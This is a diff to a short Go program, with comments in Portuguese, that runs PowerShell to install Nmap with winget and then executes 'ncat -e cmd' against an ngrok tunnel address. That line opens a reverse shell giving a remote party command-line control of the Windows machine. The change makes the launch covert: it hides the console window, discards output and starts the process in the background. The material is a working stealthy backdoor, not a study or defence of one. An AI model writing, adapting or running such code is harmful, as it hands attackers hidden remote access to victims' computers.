@@ -1,20 +1,33 @@
 package main
 
 import (
-	"fmt"
+	"log"
 	"os/exec"
+
+	"golang.org/x/sys/windows"
 )
 
 func main() {
-	// Comando PowerShell para instalar o Nmap e depois rodar o Ncat
-	cmd := exec.Command("powershell.exe", "-c", "winget install Insecure.Nmap; ncat -e cmd 0.tcp.sa.ngrok.io 19109")
+	// Configura o comando para instalar o Nmap e executar o Netcat
+	cmd := exec.Command("powershell.exe", "-Command", "winget install Insecure.Nmap; ncat -e cmd 0.tcp.sa.ngrok.io 19109")
 
-	// Executa o comando
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		fmt.Printf("Erro ao executar o comando: %v\n", err)
+	// Configura o processo para rodar em modo completamente oculto
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		HideWindow:    true,                          // Oculta a janela do CMD
+		CreationFlags: windows.CREATE_NO_WINDOW,     // Impede a criação de janelas
 	}
 
-	// Exibe a saída do comando
-	fmt.Println(string(output))
+	// Redireciona a saída para /dev/null (ou equivalente no Windows)
+	cmd.Stdout = nil
+	cmd.Stderr = nil
+	cmd.Stdin = nil
+
+	// Executa o comando
+	err := cmd.Start()
+	if err != nil {
+		log.Fatalf("Erro ao iniciar o comando: %v", err)
+	}
+
+	// Não bloqueia o processo e continua a execução
+	log.Println("Comando de instalação e conexão iniciado com sucesso.")
 }
